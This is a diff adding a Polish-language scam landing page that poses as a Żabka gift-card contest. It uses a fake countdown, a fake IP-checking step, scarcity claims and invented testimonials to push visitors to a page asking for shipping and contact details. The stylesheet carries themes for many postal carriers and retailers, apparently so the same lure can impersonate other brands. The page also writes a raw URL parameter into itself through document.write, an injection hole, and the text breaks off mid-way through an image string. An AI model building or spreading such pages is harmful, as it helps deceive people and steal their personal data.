@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta name="baidu-analysis-id" content="2z1k2u2v2u2u3d3a2t">
+  <title>Gratulacje!</title>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="lander" content="survey-social">
+  <meta name="description" content="survey-social">
+  <link id="favicon" rel="icon"
+    href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABn0lEQVQ4T83SzSsEcRjA8e9kasfY3dm8RFqsi3bXsl53rZbiSMqdg/KSg6vyJ3BVDg7KxU0pKQcuUttSHNhdXEjitlaLyYpGM5My1pZy8dzmeZ7fZ55n5idQIDRN6+f2domHh2ricZvRFonkcDrvcLunBUHY01PCT+e1i4thVHWVaFShthbW16GuDux2cDggFssiiiOCz7clsJrSviJ9VTIbFRmU9lYoKYHra0gkoKPDBD7j9DRLIDCUB5x1yXjb/KCqIEng9UI0CvPzVkCfJJE4twChcokd9zPOlibrZjMz+YDekUo9WoCpBheLqW1sE+O/A1ZWcn8FXi1AZ7nEbo2KMxgwJxBF8HhgdBRmZyEYhEwG0mmz/n0FIxeW8XUG4OnJPHx1ZV1nYQHm5sDlgpOTs7y/0Fsps1mVRWltLnTHzHwymcXvH8gD9NqgorHmeUfp6TYn+RqKwuN+DEcRA0Jj4/aPgN7fU1nMsgfcbyq2wwODyIXC3Igyk5cQG6w3bnFB4POl7WUSbaWS8Xh8/8JR+sUsjfl/BxT8EP8G+ADLLJpS1/YmQAAAAABJRU5ErkJggg==">
+  <style>
+    .theme {
+      --header-background: #ffffff;
+      --text-color: #000;
+      --text-highlight: #ff0636;
+      --button-background: #ff0636
+    }
+
+    .theme--ups {
+      --header-background: #341b13;
+      --text-color: #000;
+      --text-highlight: #713100;
+      --button-background: #00857d
+    }
+
+    .theme--la-poste {
+      --header-background: #ffd641;
+      --text-color: #000;
+      --text-highlight: #003c71;
+      --button-background: #0b74d2
+    }
+
+    .theme--fedex {
+      --header-background: #4d148c;
+      --text-color: #000;
+      --text-highlight: #ff6200;
+      --button-background: #ff6200
+    }
+
+    .theme--dhl {
+      --header-background: #fdcc01;
+      --text-color: #000;
+      --text-highlight: #d60029;
+      --button-background: #d60029
+    }
+
+    .theme--blue-dart {
+      --header-background: #fdcc01;
+      --text-color: #000;
+      --text-highlight: #337ab7;
+      --button-background: #019739
+    }
+
+    .theme--pos-indonesia {
+      --header-background: #ff6f00;
+      --text-color: #000;
+      --text-highlight: #d0014e;
+      --button-background: #d31c3f
+    }
+
+    .theme--thailand-post {
+      --header-background: #db1e34;
+      --text-color: #000;
+      --text-highlight: #db1e34;
+      --button-background: #db1e34
+    }
+
+    .theme--correos {
+      --header-background: #eff0f0;
+      --text-color: #000;
+      --text-highlight: #1e73be;
+      --button-background: #1e73be
+    }
+
+    .theme--sudapost {
+      --header-background: #eff0f0;
+      --text-color: #000;
+      --text-highlight: #77242a;
+      --button-background: #00822a
+    }
+
+    .theme--algerie-poste {
+      --header-background: #f9f9f9;
+      --text-color: #000;
+      --text-highlight: #01539d;
+      --button-background: #01539d
+    }
+
+    .theme--sri-lanka-post {
+      --header-background: #ed0518;
+      --text-color: #000;
+      --text-highlight: #ed0518;
+      --button-background: #ed0518
+    }
+
+    .theme--bangladesh-post-office {
+      --header-background: #f9f9f9;
+      --text-color: #000;
+      --text-highlight: #d00c0a;
+      --button-background: #d00c0a
+    }
+
+    .theme--poste-maroc {
+      --header-background: #004595;
+      --text-color: #000;
+      --text-highlight: #004595;
+      --button-background: #004595
+    }
+
+    .theme--la-poste-tunisienne {
+      --header-background: #e2e2e2;
+      --text-color: #000;
+      --text-highlight: #ffa806;
+      --button-background: #081d5c
+    }
+
+    .theme--syrian-post {
+      --header-background: #4be7fe;
+      --text-color: #000;
+      --text-highlight: #f6a910;
+      --button-background: #008bcf
+    }
+
+    .theme--la-poste-cote-d-ivoire {
+      --header-background: #f3e506;
+      --text-color: #000;
+      --text-highlight: #00614a;
+      --button-background: #00614a
+    }
+
+    .theme--liban-post {
+      --header-background: #006db7;
+      --text-color: #000;
+      --text-highlight: #006db7;
+      --button-background: #006db7
+    }
+
+    .theme--la-poste-burkina-faso {
+      --header-background: #f3c244;
+      --text-color: #000;
+      --text-highlight: #0978c2;
+      --button-background: #0b96f3
+    }
+
+    .theme--nipost {
+      --header-background: #fbcc12;
+      --text-color: #000;
+      --text-highlight: #2e2b64;
+      --button-background: #2e2b64
+    }
+
+    .theme--hero {
+      --background: #e8e8e8;
+      --header-background: #e8e8e8;
+      --text-color: #797979;
+      --text-highlight: #579b24;
+      --button-background: #579b24
+    }
+
+    .theme--7-eleven {
+      --header-background: #fff;
+      --text-color: #4a4a4a;
+      --text-highlight: #008060;
+      --button-background: #008060
+    }
+
+    :root {
+      --max-width: 900px;
+      --background: #f1f1f1
+    }
+
+    html {
+      height: 100%
+    }
+
+    body {
+      --header-background: #eaeaea;
+      --text-color: #000;
+      --text-highlight: #3862b8;
+      --button-background: #3862b8;
+      background: var(--background);
+      color: var(--text-color);
+      font-family: Helvetica, Helvetica Neue, verdana, sans-serif;
+      font-size: 13px;
+      margin: 0;
+      min-height: 100%
+    }
+
+    .heading {
+      color: var(--text-highlight);
+      margin-bottom: 10px;
+      margin-top: 0
+    }
+
+    .heading--h1 {
+      font-size: 21px
+    }
+
+    .paragraph {
+      font-size: 13px;
+      line-height: 20px;
+      margin-top: 0
+    }
+
+    .paragraph :last-of-type {
+      margin-bottom: 0
+    }
+
+    .card {
+      background-color: #fff;
+      border-radius: 5px;
+      box-shadow: 0 6px 10px rgba(0, 0, 0, .1);
+      margin-bottom: 20px;
+      padding: 20px
+    }
+
+    .header {
+      background-color: var(--header-background);
+      box-sizing: border-box
+    }
+
+    .header__content {
+      box-sizing: border-box;
+      margin: 0 auto;
+      max-width: var(--max-width);
+      padding: 3px 20px;
+      text-align: center
+    }
+
+    .header__logo {
+      height: 50px;
+      max-width: 100%
+    }
+
+    .content {
+      box-sizing: border-box;
+      margin: 0 auto;
+      max-width: var(--max-width);
+      padding: 20px
+    }
+
+    .information {
+      text-align: center
+    }
+
+    .date {
+      color: #cacaca;
+      display: block;
+      font-style: italic;
+      margin-bottom: 10px
+    }
+
+    .survey {
+      text-align: center
+    }
+
+    .survey__question {
+      font-size: 21px;
+      margin-bottom: 20px
+    }
+
+    .survey__answer {
+      -webkit-animation: quickWobble 2s infinite;
+      animation: quickWobble 2s infinite;
+      background: linear-gradient(180deg, #fe0000 10%, #A80000 90%);
+      border: 0;
+      border-bottom: 3px solid rgba(0, 0, 0, .2);
+      border-radius: 4px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, .2);
+      color: #fff;
+      cursor: pointer;
+      display: block;
+      font-size: 16px;
+      margin-bottom: 10px;
+      padding: 10px;
+      text-align: center;
+      width: 100%
+    }
+
+    .survey__answer :nth-of-type(2) {
+      -webkit-animation-delay: .15s;
+      animation-delay: .15s
+    }
+
+    .survey__answer :nth-of-type(3) {
+      -webkit-animation-delay: .3s;
+      animation-delay: .3s
+    }
+
+    .comments__form-input {
+      border: 1px solid #cacaca;
+      border-radius: 2px;
+      box-sizing: border-box;
+      font-size: 13px;
+      padding: 10px;
+      width: 100%
+    }
+
+    .comments__form-input :focus {
+      box-shadow: inset 2px 2px 2px rgba(0, 0, 0, .1);
+      outline: none
+    }
+
+    .comments__form-submit {
+      background-color: #3862b8;
+      border: 0;
+      color: #fff;
+      font-size: 13px;
+      padding: 10px
+    }
+
+    .text-rotator {
+      padding: 20px 0
+    }
+
+    .text-rotator__string {
+      color: var(--text-highlight);
+      font-size: 16px
+    }
+
+    .product {
+      align-items: center;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center
+    }
+
+    .product__image {
+      max-width: 220px;
+      width: 100%
+    }
+
+    .product__details {
+      text-align: start
+    }
+
+    .product__title {
+      color: var(--text-highlight);
+      font-weight: 700
+    }
+
+    .product__your-price em {
+      color: #34a853
+    }
+
+    .product__stock-amount {
+      background-color: #34a853;
+      border-radius: 3px;
+      color: #fff;
+      display: inline-block;
+      font-size: 12px;
+      margin: 0 3px;
+      padding: 0 3px
+    }
+
+    .product__button {
+      -webkit-animation: quickWobble 2s infinite;
+      animation: quickWobble 2s infinite;
+      background: linear-gradient(180deg, #fe0000 10%, #A80000 90%);
+      border: none;
+      border-bottom: 3px solid rgba(0, 0, 0, .2);
+      border-radius: 4px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, .2);
+      color: #fff;
+      cursor: pointer;
+      font-size: 19px;
+      height: 50px;
+      line-height: 45px;
+      margin-left: auto;
+      margin-top: 10px;
+      text-decoration: none;
+      width: 100%
+    }
+
+    @-webkit-keyframes quickWobble {
+
+      0%,
+      89% {
+        transform: scale(1)
+      }
+
+      90% {
+        transform: scale(1.04)
+      }
+
+      to {
+        transform: scale(1)
+      }
+    }
+
+    @keyframes quickWobble {
+
+      0%,
+      89% {
+        transform: scale(1)
+      }
+
+      90% {
+        transform: scale(1.04)
+      }
+
+      to {
+        transform: scale(1)
+      }
+    }
+
+    #clock {
+      color: #d61313;
+      font-size: 2em;
+      padding: 10px 0px;
+    }
+
+    .modal-backdrop.fade {
+      filter: alpha(opacity=0);
+      opacity: 0
+    }
+
+    .modal-backdrop.in {
+      filter: alpha(opacity=50);
+      opacity: .5"
+
+    }
+
+    canvas {
+      display: block;
+      position: relative;
+      zindex: 1;
+      pointer-events: none;
+      position: fixed;
+      top: 0;
+    }
+
+    .dear {
+      background: linear-gradient(180deg, #fe0000 10%, #A80000 90%);
+      color: #ffffff;
+    }
+  </style>
+  <script>
+    function getURLParameter(name) {
+      return decodeURIComponent(
+        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+      );
+    }
+  </script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="js/622d75c818468_v.js"></script>
+</head>
+
+<body class="theme theme--default">
+  <main id="app" v-cloak="">
+    <div class="header">
+      <div class="header__content">
+        <img class="header__logo" src="下载.webp" width="75" height="50">
+      </div>
+    </div>
+    <div class="header dear">
+      <div class="header__content">
+        <h2>żabka konkurs</h2>
+      </div>
+    </div>
+    <div class="content">
+      <div class="card information" v-if="!showPrize">
+        <h2>
+          <div>tylko dziś: <span class="date_day_number"></span> <span class="date_month"></span></div>
+        </h2>
+        <h1 class="heading heading--h1">Gratulacje!</h1>
+        <h3 class="paragraph">
+          <div>każdy <span class="date_day_week"></span> wybieramy 10 szczęśliwych użytkowników <b
+              style="color:#c82311"><span id="user-os"></span></b> z <b style="color:#c82311;">
+              <script>document.write(getURLParameter('city'))</script>
+            </b>, którzy otrzymują szansę wygrania <span>1500zl karta podarunkowa żabka</span>.</div>
+          <p style="text-align:center"> <img src="1.webp" width="160" height="114"></p>
+          <sub> Aby odebrać swój prezent, odpowiedz na poniższe trzy pytania!</sub>
+          <div style="align" style="width:50%;">Masz tylko
+            <span id="clock"></span>
+            aby wziąć udział.
+            Pospiesz się! Liczba nagród jest ograniczona!
+          </div>
+        </h3>
+      </div>
+
+      <div class="card survey">
+        <vue-survey :questions="[
+            {
+              title: &quot;Pytanie 1 z 3: Jesteś mężczyzną czy kobietą?&quot;,
+              answers: [
+                { text: &quot;Człowiek&quot; },
+                { text: &quot; Kobieta&quot; },
+              ]
+            },
+            {
+              title: &quot;Pytanie 2 z 3: Ile masz lat?&quot;,
+              answers: [
+                { text: &quot;Poniżej 18 roku życia&quot; },
+                { text: &quot;18-39&quot; },
+                { text: &quot;40-50&quot; },
+                { text: &quot;50+&quot; },
+              ]
+            },
+            {
+              title: &quot;Pytanie 3 z 3: Czy jesteś zadowolony z usług żabka?&quot;,
+              answers: [
+                { text: &quot;Jestem bardzo zadowolony&quot; },
+                { text: &quot;Jestem zadowolony&quot; },
+                { text: &quot;Nie jestem zadowolony&quot; },
+              ]
+            },
+          ]" v-show="!showRotator &amp;&amp; !showPrize" v-on:finish="showRotator = true"></vue-survey>
+        <vue-text-rotator :strings="[
+            &quot;Sprawdzanie adresu IP...&quot;,
+            &quot;Sprawdzanie odpowiedzi...&quot;,
+            &quot;Sprawdzanie dostępności nagród...&quot;,
+          ]" v-if="showRotator &amp;&amp; !showPrize" v-on:finished="showPrize = true"></vue-text-rotator>
+        <div class="prize" v-if="showPrize">
+          <h2>Twój prezent</h2>
+          <div class="product">
+            <img class="product__image" src="1.webp" width="220" height="163" alt="">
+            <div class="product__details">
+              <div class="product__title">Darmowe zakupy, na które będziesz mieć 1500&nbsp;zl karta podarunkowa
+                żabka</div>
+              <div class="product__normal-price">
+                Normalna cena: 1500&nbsp;zl
+              </div>
+              <div class="product__your-price">
+                Twoja cena: <em>Bezpłatny</em>
+              </div>
+              <div class="product__stock">
+                Na stanie: <span class="product__stock-amount">2</span>
+                <br>
+                <sub>* Liczba dostępnych produktów jest ograniczona</sub>
+                <h5>1.Kliknij „Zdobądź to teraz”, aby przejść do następnej strony.</h5>
+                <h5>2. Dokładnie wypełnij następną stronę informacji o wysyłce i dane kontaktowe.</h5>
+                <h5>3. Twój 1500zl karta podarunkowa żabka zostanie wysłany w ciągu 2 dni roboczych.</h5>
+              </div>
+            </div>
+
+            <span class="product__button" onclick="go();" id="final-button">
+              Zdobądź to teraz
+            </span>
+          </div>
+        </div>
+      </div>
+      <div class="card comments">
+        <h1 class="heading heading--h1">Komentarze</h1>
+        <vue-facebook-comment
+          avatar="data:image/jpeg;base64,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"
+          width="50" height="50" name="Anna Nowak"
+          message="Z początku nie byłem pewny, czy to nie ściema, lecz dziś otrzymałem nagrodę, to Darmowe zakupy, na które będziesz mieć 1500zl karta podarunkowa żabka"
+          :likes="182" like-text="Polub" reply-text="Odpowiedz" since-text="teraz"
+          v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+        <vue-facebook-comment
+          avatar="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAkACQAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAA5ADkDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD07SVmt7cm9jFzcl2dHzvIX0DEDpVSbWt1u+HNsyttjWYhTgE85DHg4P8AhWPqeo6tJ4Ptdftb6QwoTK0aDaWRshQT3AyB0HrXGQeKNW1qQwR2SLDwJGVcE498g/qKtvdsai0rI9B0y+vVkvNQv5VeLyt/+j2zIMLz948twePxqrqXjbQ49Ke6hvoUvGBCRzcuuCRyOcdvwrl5NP1HVruDQ4r6aJ4p3dpo3YKikAYwST78nPNP1H4SWu4mLVGA2/Mdgyx9+a55ThGfM2bxpuUOW2vcevjNTpFjfLFbSy3GoeVOz7d4PljGDxgbgaX4oanrS+FIriC1e2hM6rLMhOcfNjrgjJx+lYEPgWXw1NBqksyX1hDOouIHTJEZON491zmvRdXtEfwbDorLK0ayQj9+6AsolVuQTnoPw960jVT1RjOlKLszlvCc2ra/orR3MsrXF1piKshUkgq8wV8gjP3gefX2rnP7I1f/AJ6WH/fP/wBatfThquj+P7HTVupIrC1hkZItuA8XmZC5wOPmH5V6Z/atv/z7L+dY+05XrqWoNrQyLPXrW98BRMI49jRNAFdtjAqSv3cHGMfpXGC7ZLrIvpMZ5RRhDyRgrjn86x5NU8yMKu1V2/LGowOQ3OOe59KqvdTBSzfJzkB/lzyp7n39K0sj2aOHjTjq7nd6FGILm91aa4EiSM0xKpgoMKNuPpj60yD4hWmo6mdPt9OuWYkqshxhvpTfAmo28+lvbjy/tUTFGwQw2knHT6NWhdanpGhXjXU9qEDnHnooY7vf0FcNR3m0zJU0n7uxjXXi/TNWkutKtAwvWVoxG3Ck46FjwPrXLT/8JBbXzpe6rb2qRwpKWtCJsBmK/fXAGCPXuOtbgl0lTPq0ESh0DSZKjLD1x61zHiHxDrHiXWEIgnkLQCJ1ATlPMVhgA8njOM9/Tmt8PJpSUXY5sTGzV1f5FyGXQ7XVNOvn1O8uZoJQUcqMyMGDYyx6cD8/evV/+Ejvf+hcP/f6L/GvHtEtpxYhDBsRmPzSYJX7oyccqRgc8+ld9/wlunf8/cf/AHwv+FXTpuV22ZSa7HlT3Uq20RE0iIw+4rEKBkDpkZ71HpWmXmvXYtLONppSMtlsIgxgsccAcDmu/wDB/gGw1HTk1HWZJZRIWMcCnaNuTyxHP5Gu4ax0rQNGubbTbNYFkVshSSWPuSc1lUxCjex3OpdJWOYsfDf/AAiOjxyiZJbyZzJKyDAY9Qi57Y3HnvWPNHZ6tbNcRXapcu5LiSV1A9sAjoK6y/kj1nw/stp0ZyvyMrA7XHSvErGO51bXDbTpiVnYSBRjBHWsIJzvNvYj2zhJLud/oVjYXOpXFmkzFRGHUBs+awPPXt/nNdXbeHbW7tXazuIpEOf3ZTYY257ncR16eoryqO/l0bxxa+VtWJFSDBPG0tz+OTXo9s9xa6vNKweNZZMDkYbgYIx9cc88UptwSfRk355PyOb1rQ/FV/rN1aQ2Fw1tG+yNlbbHMOodiTjoeB29BUX/AArnxN/zytv++1/xr0d9bbTreeZ4/NCpuK7Sx47gAE9M/lWT/wALEb/nwn/8BX/wrOeNqwdorT0/4JKwylq2bEOhPpGnR29pdyTeUgTEhxvA747GqFxdSS2f7zduBKncMH8a1NS/5C9v9D/Ks3U/ut9aze5tzNu73ItKigitPLjRUKk5wMZyc5/z6V59q1iul/ERycpb3Y83IOMbhg/+PDP416FY9W/3V/rXH+Of+Rk0z/ri38xXRhXadu5hiF7pwXiiJ7XXNqNxCwYHPVuDk/nXrvnrfaLbXiHIKq4P1/8A115b4s/5Cf4j/wBBFejeGv8AkSrX/rlW+NXupmWGbUmi69/5UsEhGQRgj15/+vUvkab/AHf/AB6sq8/484/94/0rQrzXFPdHddrY/9k="
+          width="50" height="50" name="Sebastian Zieliński" message="Czy ktokolwiek z was wygrał coś w tej loterii??"
+          :likes="125" like-text="Polub" reply-text="Odpowiedz" since-text="9 min"
+          v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+        <vue-facebook-comment
+          avatar="data:image/webp;base64,UklGRroDAABXRUJQVlA4IK4DAABQDwCdASowADAAPoE0lEelIyIhMc34oBAJagCnRzRGFIisLbODhQyNu1z2TjBdpv3nwL8J/rWMGcB9JMT3JedFOEVVQ0ryH6hv62hkeUd5ifloUoPeoZClUZoEZPGDwxYCx5ih5osN4zUHPxm18MqIdkwtZHQV5WZOuqHpMp6HmfC+4ADJ53EEO6xG6vHAXZX7KDWhXOU02X3Z+N5KjWrU+YaUxYiYgCPJ35rEbVlUylbkio3bjkNbo6dTqLcURWG98JPCgE6fQeutvrWx3Eu+cULcPfquBdvwBF2gyQ+B4QzvEWUkF6BPLe779Fvukxbt9ndIO8UwG6CNM4hYyOhPhfqnUOTAu7Yg/8UbEtff/XUYToIbB2/RmYlmvxNEWUoZu8SF4j/VPIpb2ZRcMO4Szw5Zu+fhrG8GFj74DnNUcmNOxEffPYuZef7q2HO8wTHL1zmYx/skPrGNzEPlNxT1ZefkM5gdOx3SxZ3SrTiICUlIef8+CLlIXx2jhOSyEkcsd5pVNbzTXDj969Ypom9XeD6bDEMJQKgM7PRC4zZY1IJJr9UwiUJL5cjjhXWDxQvWtmOBaj6qXNvEq9/dFhypCRwtHT80x6YDuGWBP0jclM1dPY3YXrXCMn+OiPgCEqYXEOmUDO2Wj0Ez2jt81fN5vmNA0uz9SNhAYpDfko3YvnJXcPWfd6KGn2j16KXJ+aBjpVZ7hGrOcPuqqWMdtivoPmH1Vuw3G1qibVoJ+y+B3mIORi1GeeKV5MInOX1WJ4DdSccVHXxIYifNW5nqgoZFKf8EFqeShrmYm6ZYlc8dO6mzg+xZPSmPoGwV2R9aAW7AeSM4U5gOQp1ICcGKlaE91HjrxEUDMnCYO852t3CNlVuXC3TmbzUDhvbQl/JfoagNa4+fYf+nFl4CanKJSSVQCRxHYPMjdVYysNO6Y415PtilDFjwRVXx2YVel5sxhWOTJnbc23qCUM6Z97W206qYx4bd6JGmxElW2S+4tfHuztZX0dikwmfpsyf5kHpgV9JLfcpfTtW9r01kJgJKkBXDGLS8Cgg9CKo0W2qIqMpfFjruYq9BZZDsK0hpCZ5yGEM+GlcLDR1eKTzFTCt/T+BBWILz6mQbjh2l5RYsHSWs7jXG+29/GVKAo7FFYxp/GvY7ThYFGdU6QBrKOn5fpODY+UMrCbzmsWJQyYSCA1P6ijO3mnA68O7jYx7VAgFw7X/dSh3MlXMRtcLnmglNT/nxhXi9ONh99l43a34AAAA="
+          width="50" height="50" name="Marta Wiśniewska"
+          message="Jak to działa? Kilka lat temu wygrałem karta podarunkowa żabka, lecz wszystkie moje późniejsze próby były nieudane..."
+          :likes="109" like-text="Polub" reply-text="Odpowiedz" since-text="16 min"
+          v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+        <vue-facebook-comment
+          avatar="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAkACQAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAA/AD8DASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwDk55bg30kuwumNq46qPpSC8QHDHafQ8VO9xbMc+YFPvx/OoXKOpw4ZT+IpcrOjnQjTqehoj/eyBAeTVSSKPPC491OKfb7bcvOJzhEY7WHP3TSYr3Y/UbyHTo2Zz82K5qbxGwPyoTntXV6J4Pl8RsL/AFSR4rZ+Yol+8R6n0rrT8MPDssGPKlVsffD5P6iud1oRdmdCpzaujzTTdajunEbHDnsa2Jdog8wDBBwffP8A+qofE/gSXw85vdPdpooTucEchaqy36f2YjFvvsCPfA5/mKuLUtYkTT5bS3L0kSrzkn2zVSOPy5Hbu56Cvpb/AIQvQZOumREH3Yf1rxDxPZWMXiHVbawXbb27nYCc7cHBGe49M+9diho7HI6mtmZLiw/swsZZ0ux0XAKt+PBFZFmrahqdvZ7WKyTIrkDgAkdaZdSYzjGBXR/DaEyyX87Z5dFX3xknj8uawk2k2awSlJI7EXFxpzCKGxWWJABgTANj1xWvNrEFvpq3jJJtI4QLkk1Rk02ykkN3Jbo8yA4ZlBNQyRR31j9nmJVG6AcYrz3Zs9JRkN+3QatBJGElTzVI/exkZrw3VrhoL+a1THlwSMiY6YBNe52elQ6TZt5csznH/LSQt+WTXjnjy3srLxNJDZqqosalwCSdx5JPvgit6FudowxMXyKTPsjU7xdO0u7uyOIIWf6kDivmiTTdTvftcqrsadurnG4ZJz+v6V3Wp+JtQ1oMbm5KIQB5MZKp+XesiMvISq9ScZrT65ZNRWnc6Y5I0lKo/eado/5s5zRvAWo6pqHlyRNJBGV3+Uc5B9+w4613N74SvvD72stvaCCCJ0DmJcoyFhkZ7euarWN/c6Rq0dxCfmj9GwCPQjuD/SvUdQ1ez